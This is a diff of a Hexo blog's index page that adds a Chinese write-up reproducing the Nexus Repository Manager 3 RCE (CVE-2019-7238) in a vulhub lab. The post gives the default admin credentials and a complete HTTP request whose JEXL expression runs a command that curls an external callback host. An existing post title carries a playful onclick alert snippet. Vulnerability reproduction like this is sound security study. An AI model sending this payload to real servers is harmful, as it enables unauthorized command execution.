@@ -130,6 +130,48 @@ var _hmt = _hmt || [];
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2019/04/03/Nexus Repository Manager 3 RCE(CVE-2019-7238)复现/" >Nexus Repository Manager 3 RCE(CVE-2019-7238)复现</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-04-03  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p>Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET等软件源仓库。其3.14.0及之前版本中，存在一处基于OrientDB自定义函数的任意JEXL表达式执行功能，而这处功能存在未授权访问漏洞，将可以导致任意命令执行漏洞。本文主要记录其复现过程方便日后查看，环境使用vulhub的环境。</p>
+<p>环境安装过程略过，安装成功后可访问其页面：</p>
+<p><img src="/2019/04/03/Nexus Repository Manager 3 RCE(CVE-2019-7238)复现/./test/3-1.jpg" alt="3-1"></p>
+<p>使用默认用户名密码登录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:admin123</span><br></pre></td></tr></table></figure>
+<p>登录后在maven-releases下随便上传一个jar包，因为触发该漏洞必须保证该仓库里有一个包</p>
+<p><img src="/2019/04/03/Nexus Repository Manager 3 RCE(CVE-2019-7238)复现/./test/3-2.jpg" alt="3-2"></p>
+<p>上传成功后，可以去search中的maven中查看是否有你刚才写的group ID、version等</p>
+<p>另外如果是自己新搭建的环境，为复现成功，还需要先往现有的Repository添加asset。</p>
+<p>然后可以直接发送如下请求：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/service/extdirect</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span>: 382</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"action":"coreui_Component","method":"previewAssets","data":[&#123;"page":1,"start":0,"limit":50,"sort":[&#123;"property":"name","direction":"ASC"&#125;],"filter":</span><br><span class="line">[&#123;"property":"repositoryName","value":"*"&#125;,&#123;"property":"expression","value":"233.class.forName('java.lang.Runtime').getRuntime().exec('curl http://zd24vl.ceye.io/test1')"&#125;,&#123;"property":"type","value":"jexl"&#125;]&#125;],"type":"rpc","tid":8&#125;</span><br></pre></td></tr></table></figure>
+<p>返回成功，然后可以在远程捕获到http请求，此处就不展示了。</p>
+<p>参考：</p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2019-7238" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2019-7238</a></p>
+<p><a href="https://xz.aliyun.com/t/4136" target="_blank" rel="noopener">https://xz.aliyun.com/t/4136</a></p>
+
+	
+	</div>
+  <a type="button" href="/2019/04/03/Nexus Repository Manager 3 RCE(CVE-2019-7238)复现/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2018/10/25/sqlinject-part1/" title="sql注入部分总结-----&gt; &lt;a href=&#34;&#34; onclick=&#34;alert(&#39;o(￣ヘ￣o#)都说了让你不要点&#39;)&#34;&gt;请不要点击此处&lt;/a&gt;">SQL注入部分总结(一)</a>
 		</h3>
 		</div>
@@ -408,6 +450,8 @@ var _hmt = _hmt || [];
 		
 			<li><a href="/tags/security-sql/">security sql<span>1</span></a></li>
 		
+			<li><a href="/tags/RCE/">RCE<span>1</span></a></li>
+		
 		 
 		</ul>
 	</div>
@@ -418,6 +462,10 @@ var _hmt = _hmt || [];
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2019/04/03/Nexus Repository Manager 3 RCE(CVE-2019-7238)复现/" ><i class="fa fa-file-o"></i>Nexus Repository Manager 3 ...</a>
+      </li>
     
       <li>
         <a href="/2018/10/25/sqlinject-part1/"  title="sql注入部分总结-----&gt; &lt;a href=&#34;&#34; onclick=&#34;alert(&#39;o(￣ヘ￣o#)都说了让你不要点&#39;)&#34;&gt;请不要点击此处&lt;/a&gt;" ><i class="fa fa-file-o"></i>SQL注入部分总结(一)</a>
@@ -457,7 +505,7 @@ var _hmt = _hmt || [];
   </div>
   <div class="container-narrow">
   <footer> <p>
-  &copy; 2018 John Doe
+  &copy; 2019 John Doe
   
       with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
      <br> Theme by <a href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.    
